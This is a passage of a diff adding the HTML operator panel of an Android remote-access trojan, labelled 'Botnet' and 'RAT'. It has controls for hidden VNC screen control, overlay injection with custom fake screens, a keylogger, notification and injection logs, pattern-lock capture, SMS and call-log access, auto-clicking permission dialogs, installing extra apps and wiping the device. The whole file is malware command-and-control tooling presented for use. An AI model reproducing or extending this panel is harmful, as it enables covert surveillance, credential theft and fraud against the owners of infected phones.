@@ -1,0 +1,1490 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    
+    <meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="xxx RAT | Admin Panel">
+	<meta name="keyword" content="xxx RAT | Admin Panel">
+	<link rel="icon" href="assets/images/favicon.ico" type="image/x-icon"> <!--[ Favicon]-->
+    <title>Botnet | Admin Panel</title>
+	
+    <!--[ Favicon]-->
+	<link rel="icon" type="image/x-icon" href="assets/images/favicon.ico">
+	<link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x16.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x32.png">
+	<link rel="apple-touch-icon" sizes="180x180" href="assets/images/apple-touch-icon.png">
+
+	<link rel="stylesheet" href="assets/css/dataTables.min.css">
+	<!--[ Template main css file ]-->
+	<link rel="stylesheet" href="assets/css/style.min.css">
+	
+	<script src="../b4j_ws.js"></script>
+    <script src="../reconnecting-websocket.js"></script>
+</head>
+
+<!-- <body data-bvite="theme-CeruleanBlue" class="layout-border svgstroke-a layout-default"> -->
+<body data-bvite="theme-CeruleanBlue" class="layout-border svgstroke-a layout-default sidebar-hide">
+
+	<!-- start: main grid layout -->
+	<main class="container-fluid px-0">
+
+		<div class="px-md-4 px-2 pt-2 pb-2 brand" data-bs-theme="none">
+			<div>
+				<div class="d-flex align-items-center pt-1">
+					<button class="btn d-inline-flex d-xl-none border-0 p-0 pe-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvas_Navbar">
+						<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+							<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+							<path d="M4 6l16 0"></path>
+							<path d="M4 12l16 0"></path>
+							<path d="M4 18l16 0"></path>
+						</svg>
+					</button>
+					<!--[ Start:: Brand Logo icon ]-->
+					<a href="dashboard.html" class="brand-icon text-decoration-none d-flex align-items-center" title="BVITE Admin Template">
+					
+					<img src="assets/images/small2.png" style=" max-width: 190px; " />
+					
+					
+						
+					</a>
+				</div>
+				 
+			</div>
+			<div class="d-none layout-a-action">
+				<div class="mb-2">
+					<a class="d-flex align-items-center lh-sm p-0" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false" title="User">
+						<img class="avatar rounded-circle border border-3 shadow" src="assets/images/profile_av.png" alt="avatar">
+					</a>
+					<div class="dropdown-menu dropdown-menu-end shadow p-2 p-xl-3 rounded-4">
+						<div class="bg-body p-3 rounded-3">
+							<h4 class="mb-1 title-font text-gradient">Michelle Glover</h4>
+							<p class="small text-muted">michelle.glover@gmail.com</p>
+							<input type="text" class="form-control form-control-sm" placeholder="Update my status">
+						</div>
+						<ul class="list-unstyled mt-3">
+							<li>
+								<a class="dropdown-item rounded-pill" aria-label="my wallet" href="my-wallet.html">
+									<span class="align-middle">Balance: <span class="fw-bold text-success"><span data-purecounter-start="0" data-purecounter-separator="," data-purecounter-currency="$" data-purecounter-end="14000" class="purecounter">0</span></span></span>
+								</a>
+							</li>
+							<li><a class="dropdown-item rounded-pill" aria-label="my profile" href="my-profile.html">My Profile</a></li>
+							<li><a class="dropdown-item rounded-pill" aria-label="my task" href="my-task.html">My Taskboard</a></li>
+							<li><a class="dropdown-item rounded-pill" aria-label="account settings" href="account-settings.html">Settings</a></li>
+							<li class="dropdown-divider"></li>
+							<li><a class="dropdown-item rounded-pill" aria-label="Add another account" href="#">Add another account</a></li>
+						</ul>
+						<a class="btn py-2 btn-primary w-100 mt-3 rounded-pill" href="signin.html" role="button">Logout</a>
+						<div class="mt-3 text-center small">
+							<a class="text-muted me-1" href="#!">Privacy policy</a>•<a class="text-muted mx-1" href="#!">Terms</a>•<a class="text-muted ms-1" href="#!">Cookies</a>
+						</div>
+					</div>
+				</div>
+				<a href="#" class="btn p-1" title="Sign out">
+					<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M7 6a7.75 7.75 0 1 0 10 0"></path>
+						<path d="M12 4l0 8"></path>
+					</svg>
+				</a>
+			</div>
+		</div>
+
+		<!-- start: page header -->
+		<header class="px-md-4 px-2" data-bs-theme="none">
+			<div class="d-flex justify-content-between align-items-center py-2 w-100">
+				<button type="button" id="btnloading" class="btn text-accent btn-link p-0 me-3 d-none d-md-inline-flex" data-bs-toggle="modal" data-bs-target="#FullscreenMenu" style="display:none !important;">
+					 
+				</button>
+				<!--[ Start:: Full screen modal popup menu ]-->
+				<div class="modal fade" id="FullscreenMenu" tabindex="-1" aria-labelledby="FullscreenMenu" aria-hidden="true" data-bs-theme="dark" style="z-index:100000;">
+					<div class="modal-dialog modal-fullscreen">
+						<div class="modal-content border-4 border border-primary">
+							<div class="modal-header border-0">
+								<button id="btncloseloading" type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+							</div>
+							<div class="modal-body custom_scroll">
+								<div class="container-xxl">
+									<h5 class="text-light fw-light">Connecting to server...</h5>
+									 
+									<div class="row g-5">
+										<div class="col-lg-3 col-md-6 col-sm-6">
+											<h6 class="mb-1 text-light fw-light">the session is being initiated</h6>
+											<p class="text-muted small">Please wait...</p>
+											<p class="text-muted small">If it takes more than 1 minute then please close the dialog and try again</p>
+											 
+										</div>
+										 
+										 
+									</div>
+								</div>
+							</div>
+							 
+						</div>
+					</div>
+				</div>
+
+				
+				
+				<ul class="header-menu flex-grow-1">
+					 
+					 
+					<!--[ Start:: theme light/dark ]-->
+					<li class="nav-item dropdown px-md-1">
+						<a class="dropdown-toggle gray-6" href="#" id="bd-theme" data-bs-toggle="dropdown" aria-expanded="false">
+							<svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24" class="theme-icon-active"><use href="#sun-fill"></use></svg>
+						</a>
+						<ul class="dropdown-menu dropdown-menu-end p-2 p-xl-3 shadow rounded-4" aria-labelledby="bd-theme">
+							<li class="mb-1"><a class="dropdown-item rounded-pill" href="#" data-bs-theme-value="light"><svg class="avatar xs me-2 opacity-50 theme-icon" fill="currentColor"><use href="#sun-fill"></use></svg> Light</a></li>
+							<li class="mb-1"><a class="dropdown-item rounded-pill active" href="#" data-bs-theme-value="dark"><svg class="avatar xs me-2 opacity-50 theme-icon" fill="currentColor"><use href="#moon-stars-fill"></use></svg> Dark</a></li>
+							<li class="mb-1"><a class="dropdown-item rounded-pill" href="#" data-bs-theme-value="auto"><svg class="avatar xs me-2 opacity-50 theme-icon" fill="currentColor"><use href="#circle-half"></use></svg> Auto</a></li>
+						</ul>
+						<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16" style="display: none;">
+							<symbol id="sun-fill" viewBox="0 0 16 16">
+								<path d="M12 8a4 4 0 1 1-8 0 4 4 0 0 1 8 0zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+							</symbol>
+							<symbol id="moon-stars-fill" viewBox="0 0 16 16">
+								<path d="M6 .278a.768.768 0 0 1 .08.858 7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71 0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+								<path d="M10.794 3.148a.217.217 0 0 1 .412 0l.387 1.162c.173.518.579.924 1.097 1.097l1.162.387a.217.217 0 0 1 0 .412l-1.162.387a1.734 1.734 0 0 0-1.097 1.097l-.387 1.162a.217.217 0 0 1-.412 0l-.387-1.162A1.734 1.734 0 0 0 9.31 6.593l-1.162-.387a.217.217 0 0 1 0-.412l1.162-.387a1.734 1.734 0 0 0 1.097-1.097l.387-1.162zM13.863.099a.145.145 0 0 1 .274 0l.258.774c.115.346.386.617.732.732l.774.258a.145.145 0 0 1 0 .274l-.774.258a1.156 1.156 0 0 0-.732.732l-.258.774a.145.145 0 0 1-.274 0l-.258-.774a1.156 1.156 0 0 0-.732-.732l-.774-.258a.145.145 0 0 1 0-.274l.774-.258c.346-.115.617-.386.732-.732L13.863.1z"/>
+							</symbol>
+							<symbol id="circle-half" viewBox="0 0 16 16">
+								<path d="M8 15A7 7 0 1 0 8 1v14zm0 1A8 8 0 1 1 8 0a8 8 0 0 1 0 16z"/>
+							</symbol>
+						</svg>
+					</li>
+					 
+					<li class="nav-item py-2 py-md-1 col-auto">
+						<div class="vr d-none d-sm-flex h-100 mx-sm-2"></div>
+					</li>
+					<!--[ Start:: user detail ]-->
+					<li class="nav-item user ms-3">
+						<a class="dropdown-toggle gray-6 d-flex text-decoration-none align-items-center lh-sm p-0" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false" title="User" data-bs-auto-close="outside">
+							<img class="avatar rounded-circle border border-3" src="assets/images/xs/devicedetails1.png" alt="avatar">
+							<span class="ms-2 fs-6 d-none d-sm-inline-flex">Admin</span>
+						</a>
+						<div class="dropdown-menu dropdown-menu-end shadow p-2 p-xl-3 rounded-4">
+							<div class="bg-body p-3 rounded-3">
+								<h4 class="mb-1 title-font text-gradient">Admin</h4>
+								<p class="small text-muted">Admin@admin.com</p>
+								 
+							</div>
+							 
+							<a class="btn py-2 btn-primary w-100 mt-3 rounded-pill" href="index.html" role="button">Logout</a>
+							 
+						</div>
+					</li>
+				</ul>
+			</div>
+		</header>
+
+<!-- start: page menu link -->
+	
+		
+		<!-- start: page icon link -->
+		<aside class="ps-4 pe-3 py-3 rightbar" data-bs-theme="none">
+			<div class="navbar navbar-expand-xxl px-3 px-xl-0 py-0">
+				<div class="offcanvas offcanvas-end" data-bs-scroll="true" tabindex="-1" id="offcanvas_rightbar" aria-labelledby="offcanvas_rightbar">
+					<div class="offcanvas-header" style="background: var(--body-color);">
+						<h5 class="offcanvas-title">Quick access</h5>
+						<button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+					</div>
+					<div class="offcanvas-body flex-column custom_scroll" style="background: var(--body-color);">
+						
+						<ul class="nav nav-tabs tab-card justify-content-between px-0" role="tablist">
+							<li class="nav-item" role="presentation"><button class="nav-link pt-0 active" data-bs-toggle="pill" data-bs-target="#pills_today" type="button" role="tab" aria-selected="true">Quick</button></li>
+							
+							<li class="nav-item" role="presentation"><button class="nav-link pt-0" data-bs-toggle="pill" data-bs-target="#divoverlaytab" type="button" role="tab" aria-selected="false" tabindex="-1">Overlay</button></li>
+							
+							<li class="nav-item" role="presentation"><button class="nav-link pt-0" data-bs-toggle="pill" data-bs-target="#keylogger" type="button" role="tab" aria-selected="false" tabindex="-1" id="btnkeyloggertab">Keylogger</button></li>
+							
+							<li class="nav-item" role="presentation"><button class="nav-link pt-0" data-bs-toggle="pill" data-bs-target="#divcontrols" type="button" role="tab" aria-selected="false" tabindex="-1">Controls</button></li>
+							
+							<li class="nav-item" role="presentation"><button class="nav-link pt-0" data-bs-toggle="pill" data-bs-target="#divnotifications" type="button" role="tab" aria-selected="false" tabindex="-1" id="btnreadnotis">Notifications</button></li>
+							<li class="nav-item" role="presentation"><button class="nav-link pt-0" data-bs-toggle="pill" data-bs-target="#divinjectionslogs" type="button" role="tab" aria-selected="false" tabindex="-1" id="btnreadinjections">Logs</button></li>
+							
+							<li class="nav-item" role="presentation"><button class="nav-link pt-0" data-bs-toggle="pill" data-bs-target="#divpermissions" type="button" role="tab" aria-selected="false" tabindex="-1" >Permissions</button></li>
+						</ul>
+						
+						
+						<div class="tab-content mt-3">
+							<!--[ Start:: tab pane today ]-->
+							<div class="tab-pane fade show active" id="pills_today" role="tabpanel">
+								 
+								<ul class="row g-4 list-unstyled li_animate mb-0 trending-blog">
+									<div class="card border-0">
+                        <div class="card-header">
+                            <h6 class="card-title mb-0">Phone Statistics</h6>
+							
+							<div class="dropdown card-action">
+						<a id="btnrefreshphonestats" href="#" class="card-fullscreen" data-bs-toggle="tooltip" aria-label="Refresh Data" data-bs-original-title="Refresh Data">
+							<i class="fa fa-refresh"></i>
+						</a>
+						 
+					</div>
+					
+                        </div>
+                        <div class="card-body hstack gap-2">
+                            <div class="px-lg-3">
+                                <h4 class="fw-bold mb-0 text-success"><span id="lblbattery" data-purecounter-start="0" data-purecounter-separator="," data-purecounter-end="0" class="purecounter">0</span></h4>
+                                <label class="small">Battery Percentage</label>
+                            </div>
+                            <div class="vr"></div>
+                            <div class="px-lg-3">
+                                <h4 class="fw-bold mb-0 text-warning"><span id="lblisoncharger" data-purecounter-start="0" data-purecounter-separator="," data-purecounter-end="0" class="purecounter">Yes</span></h4>
+                                <label class="small">Is on Charger</label>
+                            </div>
+                            <div class="vr"></div>
+                            <div class="px-lg-3">
+                                <h4 class="fw-bold mb-0 text-danger"><span id="lblconmethod">5G</span></h4>
+                                <label class="small">Network</label>
+                            </div>
+                        </div>
+                         
+                    </div>
+					</ul>
+					
+			   
+			   
+			 
+			    
+				
+				
+				<ul class="row g-1 list-unstyled li_animate">
+									 
+									 
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Cards">
+											<div class="card-body px-2">
+												<button id="btnvnc" type="button" class="btn btn-danger">OFF</button>
+												<p class="mb-0">VNC</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Cards">
+											<div class="card-body px-2">
+												<button id="btnvnc2" type="button" class="btn btn-danger">OFF</button>
+												<p class="mb-0">VNC 2</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Transfer">
+											<div class="card-body px-2">
+												<button type="button" class="btn btn-success">ON</button>
+												<p class="mb-0">HVNC</p>
+											</div>
+										</a>
+									</li>
+									 
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Bill payments">
+											<div class="card-body px-2">
+												<button id="btnhomebutton" type="button" class="btn btn-secondary">Home</button>
+												<p class="mb-0">Home Button</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Add Payee">
+											<div class="card-body px-2">
+												<button id="btnbackbutton" type="button" class="btn btn-secondary">Back</button>
+												<p class="mb-0">Back Button</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button id="btnrecentsbutton" type="button" class="btn btn-secondary">Recents</button>
+												<p class="mb-0">Recents Button</p>
+											</div>
+										</a>
+									</li>
+									
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button id="btnrefreshhvnc" type="button" class="btn btn-secondary">Refresh</button>
+												<p class="mb-0">Force Refresh</p>
+											</div>
+										</a>
+									</li>
+									
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button id="btnenablenoti" type="button" class="btn btn-success">ON</button>
+												<p class="mb-0">Enable Noti.</p>
+											</div>
+										</a>
+									</li>
+									
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button id="btnswipe" type="button" class="btn btn-danger">OFF</button>
+												<p class="mb-0">Swipe</p>
+											</div>
+										</a>
+									</li>
+									
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button id="btnvnchq" type="button" class="btn btn-secondary">VNC HQ</button>
+												<p class="mb-0">VNC HQ</p>
+											</div>
+										</a>
+									</li>
+									
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button id="btnvncmq" type="button" class="btn btn-secondary">VNC MQ</button>
+												<p class="mb-0">VNC MQ</p>
+											</div>
+										</a>
+									</li>
+									
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button id="btnvnclq" type="button" class="btn btn-secondary">VNC LQ</button>
+												<p class="mb-0">VNC LQ</p>
+											</div>
+										</a>
+									</li>
+								</ul>
+				
+								<ul class="row g-4 list-unstyled li_animate mb-0 trending-blog">
+					 <li class="col-lg-12 col-md-6">
+                    <div class="card p-2">
+								<div class="input-group">
+									<input type="text" id="txtsendtext" class="form-control" placeholder="Send Text">
+									<button type="Button" class="btn btn-secondary" id="btnsendtext">Send</button>
+								
+								</div>
+								</div>
+                </li>
+               </ul>
+								
+							</div>
+							 
+							 <div class="tab-pane fade" id="divoverlaytab" role="tabpanel">
+							
+							
+							<ul class="row g-1 list-unstyled li_animate">
+									 
+									<li class="col-12">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Withdraw">
+											<div class="card-body px-2">
+												<button type="button" id="btnlockscreen" class="btn btn-danger">OFF</button>
+												<p class="mb-0">Black Overlay</p>
+											</div>
+										</a>
+									</li>
+									
+									<li class="col-lg-12 col-md-6">
+									<br/>
+										<div class="card p-2">
+											<div class="input-group">
+												<input type="text" id="txturloverlay" class="form-control" placeholder="URL Overlay">
+												<button type="Button" class="btn btn-secondary" id="btnurloverlay">Send</button>
+											
+											</div>
+											</div>
+									</li>
+									
+									<li class="col-lg-12 col-md-6">
+									<br/>
+										<div class="card p-2">
+										<p class="mb-0">Custom Overlay</p>
+											
+											<div class="input-group">
+											
+											
+												<select class="array-select form-control form-select" id="cmbcopreset" aria-label="Preset">
+													<option selected="">Preset</option>
+													<option>Custom 1</option>
+												</select>
+										<a id="btndelpreset" class="dropdown-item rounded-pill card-options-remove" data-toggle="card-remove" style=" width: 40px; color: red !important; text-align: center; "><i class="me-2 fa fa-trash"></i></a>
+												
+											</div>
+											
+											
+											
+											<div class="input-group">
+												<input type="color" id="txtcocolor" class="form-control" placeholder="Background Color">
+												
+											</div>
+											
+											<div class="input-group">
+												<input type="text" id="txtcotoptitle" class="form-control" placeholder="Top Title">
+												
+											</div>
+											<div class="input-group">
+												<input type="text" id="txtcobottomtitle" class="form-control" placeholder="Bottom Title">
+												
+											</div>
+											
+											<div class="input-group">
+												
+												
+								<div class="file_folder d-flex flex-wrap text-center">
+								<a id="btnimgupload" class="card p-4 me-2 mb-2" href="javascript:void(0);" style="--dynamic-color: var(--theme-color1);" >
+									<i class="fa fa-folder fa-2x mb-3"></i>
+									<h6 class="mb-0">Image (PNG or JPG or GIF)</h6>
+									<div class="card-footer pb-0 pt-1 mt-2">
+										<small>1 File, MAX 1MB</small>
+									</div>
+								</a>
+								 
+								 
+								 
+							</div>
+												
+												
+												
+											</div>
+											<div class="input-group">
+												<button type="Button" class="btn btn-secondary" id="btntranslateco">Translate</button>
+												<button type="Button" class="btn btn-secondary" onclick="sendco()">Send Custom Overlay</button>
+											</div>
+												
+											
+											</div>
+									</li>
+								 
+								</ul>
+							
+							
+							
+							 
+							 
+							 </div>
+							 <div class="tab-pane fade" id="keylogger" role="tabpanel">
+							
+							
+							<ul class="row g-1 list-unstyled li_animate">
+									 
+									<li class="col-lg-12 col-md-6">
+								 
+										<button class="btn btn-outline-danger" id="btndeleteallkeylogs">Delete Key logs
+										</button>
+										
+										<div  class="table-responsive" style=" overflow-y: scroll; height: 500px !important; ">
+										
+										<input type="text" class="form-control form-control-sm" aria-label="Search Apps" id="txtSearchKeyLogstbl" onkeyup="keylogSearchFun()" placeholder="Search Apps">
+										
+	<table id="tblkeylogs" class="table table-borderless table-hover mb-0" style=" font-size: 14px !important; ">
+		<thead>
+			<tr>
+				<th>#</th>
+				<th>Data</th>
+				<th>App</th>
+				<th>Date</th>
+				
+			</tr>
+		</thead>
+		<tbody id="lstkeylogger">
+			
+		
+			 
+		</tbody>
+	</table>
+</div>
+										
+										
+										
+										
+										
+									</li>
+									 
+								 
+								</ul>
+							
+							
+							
+							 
+							 
+							 </div>
+							 
+
+
+ <div class="tab-pane fade" id="divnotifications" role="tabpanel">
+							
+							
+							<ul class="row g-1 list-unstyled li_animate">
+									 
+									<li class="col-lg-12 col-md-6">
+								  
+										
+										<div  class="table-responsive" style=" overflow-y: scroll; height: 500px !important; ">
+										
+									
+										
+	<table class="table table-borderless table-hover mb-0" style=" font-size: 14px !important; ">
+		<thead>
+			<tr>
+				<th>#</th>
+				<th>Text</th>
+				<th>App</th>
+				<th>Date</th>
+				<th>ID</th>
+				
+			</tr>
+		</thead>
+		<tbody id="tblnotis">
+			
+		
+			 
+		</tbody>
+	</table>
+</div>
+										
+										
+										
+										
+										
+									</li>
+									 
+								 
+								</ul>
+							
+							
+							
+							 
+							 
+							 </div>
+							 
+							 <div class="tab-pane fade" id="divinjectionslogs" role="tabpanel">
+							
+							
+							<ul class="row g-1 list-unstyled li_animate">
+									 
+									<li class="col-lg-12 col-md-6">
+								  
+										
+										<div  class="table-responsive" style=" overflow-y: scroll; height: 500px !important; ">
+										
+									
+										
+	<table class="table table-borderless table-hover mb-0" style=" font-size: 14px !important; ">
+		<thead>
+			<tr>
+				<th>#</th>
+				<th>Data</th>
+				<th>Date</th>
+				
+				
+			</tr>
+		</thead>
+		<tbody id="tblliveinjections">
+			
+		
+			 
+		</tbody>
+	</table>
+</div>
+										
+										
+										
+										
+										
+									</li>
+									 
+								 
+								</ul>
+							
+							
+							
+							 
+							 
+							 </div>
+							  <div class="tab-pane fade" id="divpermissions" role="tabpanel">
+							
+							
+							<ul class="row g-1 list-unstyled li_animate">
+									 
+									<li class="col-lg-12 col-md-6">
+									<br/>
+										<div class="card p-2">
+										<p class="mb-0">Manual Permissions</p>
+											
+											
+											<ul class="row g-1 list-unstyled li_animate">
+									 
+									 
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Cards">
+											<div class="card-body px-2">
+												<button id="btnperm_noti" type="button" class="btn btn-danger">OFF</button>
+												<p class="mb-0">Notifications Access</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Cards">
+											<div class="card-body px-2">
+												<button id="btnperm_candraw" type="button" class="btn btn-danger">OFF</button>
+												<p class="mb-0">Overlay</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Transfer">
+											<div class="card-body px-2">
+												<button id="btnperm_writetosystem" type="button" class="btn btn-danger">OFF</button>
+												<p class="mb-0">Write to System</p>
+											</div>
+										</a>
+									</li>
+									 <li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Transfer">
+											<div class="card-body px-2">
+												<button id="btnperm_requestinstalls" type="button" class="btn btn-danger">OFF</button>
+												<p class="mb-0">External Installs</p>
+											</div>
+										</a>
+									</li>
+									 <li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Transfer">
+											<div class="card-body px-2">
+												<button id="btnperm_calls" type="button" class="btn btn-danger">OFF</button>
+												<p class="mb-0">Phone Manager</p>
+											</div>
+										</a>
+									</li>
+									 <li class="col-4">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Transfer">
+											<div class="card-body px-2">
+												<button id="btnperm_power" type="button" class="btn btn-danger">OFF</button>
+												<p class="mb-0">Power Management</p>
+											</div>
+										</a>
+									</li>
+									  
+								</ul>
+											
+											
+									</li>
+									 
+								 
+								</ul>
+							
+							
+							
+							 
+							 
+							 </div>
+							 
+							 
+							 
+							  <div class="tab-pane fade" id="divcontrols" role="tabpanel">
+							
+							
+							<ul class="row g-1 list-unstyled li_animate">
+									 
+									<li class="col-6">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button id="btnuninstallrat" type="button" class="btn btn-secondary">Uninstall RAT</button>
+												<p class="mb-0">Uninstall RAT</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-6">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button data-bs-toggle="modal" data-bs-target="#modlpopupdata" id="btncalllogs" type="button" class="btn btn-secondary">Call Logs</button>
+												<p class="mb-0">Call Logs</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-6">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button data-bs-toggle="modal" data-bs-target="#modlpopupdata" id="btnpushnoti" type="button" class="btn btn-secondary">Push Noti.</button>
+												<p class="mb-0">Push Notifications</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-6">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button data-bs-toggle="modal" data-bs-target="#modlpopupdata" id="btnallapps" type="button" class="btn btn-secondary">Installed Apps</button>
+												<p class="mb-0">Installed Apps</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-6">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button data-bs-toggle="modal" data-bs-target="#modlpopupdata" id="btnblockapps" type="button" class="btn btn-secondary">Block Apps</button>
+												<p class="mb-0">Block Apps</p>
+											</div>
+										</a>
+									</li>
+									
+									
+										
+									<li class="col-6">
+									
+									<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Keylogger">
+											<div class="card-body px-2">
+												<button type="button" id="btnkeylogger" class="btn btn-danger">OFF</button>
+												<p class="mb-0">Keylogger</p>
+											</div>
+										</a>
+										
+									</li>
+									<li class="col-6" style="display:none !important;">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button id="btnformatdevice" type="button" class="btn btn-secondary">Format Device</button>
+												<p class="mb-0">Format Device</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-6">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button id="btnwakeupdevice" type="button" class="btn btn-secondary">Wakeup Device</button>
+												<p class="mb-0">Wakeup Device</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-6">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button data-bs-toggle="modal" data-bs-target="#modlpopupdata" id="btnsmsrat" type="button" class="btn btn-secondary">SMS RAT</button>
+												<p class="mb-0">SMS RAT</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-6">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Block Numbers">
+											<div class="card-body px-2">
+												<button  id="btnblocknumbers" type="button" class="btn btn-secondary">Block Numbers</button>
+												<p class="mb-0">Block Numbers</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-6">
+									
+									<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Keylogger">
+											<div class="card-body px-2">
+												<button type="button" id="btnautoclicksystembuttons" class="btn btn-success">ON</button>
+												<p class="mb-0">Auto System Dialog Click</p>
+											</div>
+										</a>
+										
+									</li>
+									
+									<li class="col-6">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button  id="btnpatternlockread" type="button" class="btn btn-secondary"
+												data-bs-toggle="modal" data-bs-target="#modlpopupdata22">Pattern Lock</button>
+												<p class="mb-0">Pattern Lock</p>
+											</div>
+										</a>
+									</li>
+									
+									<li class="col-6">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button data-bs-toggle="modal" data-bs-target="#modlpopupdata" id="btninstallextraapps" type="button" class="btn btn-secondary">External Apps</button>
+												<p class="mb-0">Install Other Apps</p>
+											</div>
+										</a>
+									</li>
+									<li class="col-6">
+										<a href="#" class="card border-0 text-center small text-decoration-none" aria-label="Scan &amp; Pay">
+											<div class="card-body px-2">
+												<button data-bs-toggle="modal" data-bs-target="#modlpopupdata" id="btnopenanyurl" type="button" class="btn btn-secondary">Open Link</button>
+												<p class="mb-0">Open links in browser</p>
+											</div>
+										</a>
+									</li>
+									
+									<li class="col-lg-12 col-md-6">
+									<br/>
+										<div class="card p-2">
+											<div class="input-group">
